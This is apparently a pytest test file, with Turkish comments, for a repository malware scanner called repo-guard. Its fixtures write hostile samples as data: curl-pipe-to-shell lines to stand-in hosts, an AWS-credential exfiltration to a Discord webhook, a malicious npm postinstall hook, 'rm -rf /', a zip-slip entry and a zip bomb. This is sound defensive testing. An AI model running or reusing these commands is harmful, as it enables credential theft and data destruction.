"""repo-guard testleri. Zararlı örnekler yalnızca METİN/BAYT olarak tmp klasörde üretilir; hiçbiri çalıştırılmaz."""
import io, os, random, tarfile, time, zipfile
import pytest
from repo_guard import Scanner, Limits
from repo_guard.catalog import all_rules


def scan(p, **kw):
    return Scanner(Limits(**kw)).scan(str(p))

def ids(rep):
    return {f.rule_id for f in rep.findings}

def test_rule_examples():
    for r in all_rules():
        for p in r.positives:
            assert any(r.pattern.search(l) for l in p.split("\n")), r.id
        for n in r.negatives:
            assert not any(r.pattern.search(l) for l in n.split("\n")), r.id

def test_clean_repo(tmp_path):
    (tmp_path / "a.py").write_text("print('hello')\n")
    (tmp_path / "README.md").write_text("# demo\n")
    r = scan(tmp_path)
    assert r.verdict == "no_findings" and r.complete

def test_curl_pipe_and_docs_downgrade(tmp_path):
    (tmp_path / "i.sh").write_text("curl -fsSL http://x.example/a | bash\n")
    (tmp_path / "README.md").write_text("curl -fsSL http://x.example/a | bash\n")
    r = scan(tmp_path)
    sev = {f.path: f.severity.label for f in r.findings if f.rule_id == "RG-EXEC-001"}
    assert sev["i.sh"] == "high" and sev["README.md"] == "medium"

def test_exfil_correlation(tmp_path):
    (tmp_path / "s.py").write_text("import os,requests\nk=open(os.path.expanduser('~/.aws/credentials')).read()\nrequests.post('https://discord.com/api/webhooks/123456/xyz', data=k)\n")
    r = scan(tmp_path)
    assert "RG-COR-001" in ids(r) and r.verdict == "malicious_likely"

def test_secret_is_masked(tmp_path):
    tok = "ghp_" + "aB3dE5gH7jK9" * 3
    (tmp_path / "c.py").write_text(f"T = '{tok}'\n")
    r = scan(tmp_path)
    assert "RG-SEC-001" in ids(r)
    assert all(tok not in f.snippet for f in r.findings) and r.secret_count == 1

def test_bidi_and_tags(tmp_path):
    (tmp_path / "b.py").write_text("x = 1  # \u202e hidden\n", encoding="utf-8")
    (tmp_path / "t.md").write_text("hi " + "".join(chr(0xE0000 + ord(c)) for c in "run") + "\n", encoding="utf-8")
    assert {"RG-UNI-001", "RG-UNI-002"} <= ids(scan(tmp_path))

def test_npm_hook_and_typosquat(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts":{"postinstall":"curl http://a.b/x | sh"},"dependencies":{"lodahs":"1.0.0"}}')
    r = scan(tmp_path)
    assert {"RG-PKG-001", "RG-PKG-003"} <= ids(r)

def test_setup_py_ast_not_executed(tmp_path):
    marker = tmp_path.parent / "EXECUTED"
    (tmp_path / "setup.py").write_text(f"import os\nopen({str(marker)!r},'w').write('x')\nos.system('id')\n")
    r = scan(tmp_path)
    assert "RG-PKG-011" in ids(r) and not marker.exists()      # ÇALIŞTIRILMADI

def test_workflow(tmp_path):
    d = tmp_path / ".github" / "workflows"; d.mkdir(parents=True)
    (d / "w.yml").write_text("on: pull_request_target\njobs:\n j:\n  steps:\n   - uses: actions/checkout@v4\n     with:\n       ref: ${{ github.event.pull_request.head.sha }}\n   - run: echo ${{ github.event.issue.title }}\n")
    assert {"RG-GHA-001", "RG-GHA-002", "RG-GHA-003"} <= ids(scan(tmp_path))

def test_disguised_elf(tmp_path):
    (tmp_path / "logo.png").write_bytes(b"\x7fELF" + b"\x00" * 200)
    assert {"RG-BIN-001", "RG-BIN-002"} <= ids(scan(tmp_path))

def test_zip_slip_and_bomb(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("../../evil.sh", "curl http://x.example/a | bash\n")
        z.writestr("big.bin", b"\x00" * (30 * 1024 * 1024))
    (tmp_path / "a.zip").write_bytes(buf.getvalue())
    r = scan(tmp_path)
    assert "RG-ARC-004" in ids(r) and "RG-ARC-002" in ids(r) and "RG-EXEC-001" in ids(r)

def test_tar_symlink_not_followed(tmp_path):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        ti = tarfile.TarInfo("l"); ti.type = tarfile.SYMTYPE; ti.linkname = "/etc/passwd"; t.addfile(ti)
    (tmp_path / "a.tar.gz").write_bytes(buf.getvalue())
    assert "RG-ARC-005" in ids(scan(tmp_path))

def test_symlink_outside_and_fifo(tmp_path):
    os.symlink("/etc", tmp_path / "etc_link")
    os.mkfifo(tmp_path / "pipe")                                  # açılsaydı kilitlenirdi
    t0 = time.time(); r = scan(tmp_path)
    assert "RG-FS-001" in ids(r) and time.time() - t0 < 5

def test_encrypted_zip_blindspot(tmp_path):
    # şifreli bayrağı (bit 0) elle işaretlenmiş minimal zip
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("s.txt", b"abc")
    b = bytearray(buf.getvalue())
    b[6] |= 1                                   # yerel başlık: şifreli bayrağı
    c = b.index(b"PK\x01\x02"); b[c + 8] |= 1     # merkezi dizin: şifreli bayrağı
    (tmp_path / "e.zip").write_bytes(bytes(b))
    assert "RG-ARC-006" in ids(scan(tmp_path))

def test_limits_mark_incomplete(tmp_path):
    for i in range(20): (tmp_path / f"f{i}.txt").write_text("x")
    r = scan(tmp_path, max_files=5)
    assert not r.complete and r.errors

def test_redos_timing(tmp_path):
    (tmp_path / "x.sh").write_text("curl " + "a " * 50000 + "\n" + "(" * 30000 + "\n" + "'" + "A" * 100000 + "\n")
    t0 = time.time(); scan(tmp_path); assert time.time() - t0 < 10

def test_fuzz_random_files(tmp_path):
    rnd = random.Random(1234)
    heads = [b"PK\x03\x04", b"\x1f\x8b", b"\x7fELF", b"MZ", b"BZh", b"\xfd7zXZ\x00", b"#!/bin/sh\n", b""]
    for i in range(300):
        body = bytes(rnd.getrandbits(8) for _ in range(rnd.randint(0, 3000)))
        (tmp_path / f"r{i}.bin").write_bytes(rnd.choice(heads) + body)
    r = scan(tmp_path)
    assert r.files_scanned == 300 and not [e for e in r.errors if "analiz hatası" in e]

def test_ignore_file_external(tmp_path):
    from repo_guard.scanner import IgnoreList
    ig = tmp_path.parent / "ign.txt"; ig.write_text("RG-EXEC-001 i.sh\n")
    (tmp_path / "i.sh").write_text("curl http://x.example/a | sh\n")
    r = Scanner(Limits(), IgnoreList(str(ig))).scan(str(tmp_path))
    assert "RG-EXEC-001" not in ids(r) and r.ignored_count == 1


def test_single_critical_is_not_malicious_verdict(tmp_path):
    # savunma/test içeriği: tek kritik kural "zararlı olası" kararı vermemeli
    (tmp_path / "deny.sh").write_text('rm -rf /\n')
    r = scan(tmp_path)
    assert r.verdict in ("suspicious", "review")

def test_correlation_ignored_in_markdown(tmp_path):
    (tmp_path / "x.md").write_text("curl http://a.b/c | sh\necho x >> ~/.bashrc\n")
    assert not any(i.startswith("RG-COR") for i in ids(scan(tmp_path)))


def test_gha_env_mapping_is_safe(tmp_path):
    d = tmp_path / ".github" / "workflows"; d.mkdir(parents=True)
    (d / "w.yml").write_text("on: issues\njobs:\n j:\n  steps:\n   - env:\n       TITLE: ${{ github.event.issue.title }}\n     run: echo \"$TITLE\"\n")
    assert "RG-GHA-002" not in ids(scan(tmp_path))

def test_rust_cfg_test_downgrade(tmp_path):
    (tmp_path / "lib.rs").write_text('fn a() {}\n#[cfg(test)]\nmod t {\n  const X: &str = "rm -rf /";\n  fn f(){ run("rm -rf / "); }\n}\n')
    r = scan(tmp_path)
    assert all(f.context for f in r.findings if f.rule_id == "RG-DEST-001")


def test_prompt_format_masks_secret(tmp_path):
    from repo_guard.reports import to_prompt
    from repo_guard.models import Severity
    tok = "ghp_" + "aB3dE5gH7jK9" * 3
    (tmp_path / "c.py").write_text(f"T = '{tok}'\ncurl http://x.example/a | sh\n")
    out = to_prompt(scan(tmp_path), Severity.MEDIUM)
    assert tok not in out and "RG-SEC-001" in out and "Önerilen düzeltme" in out
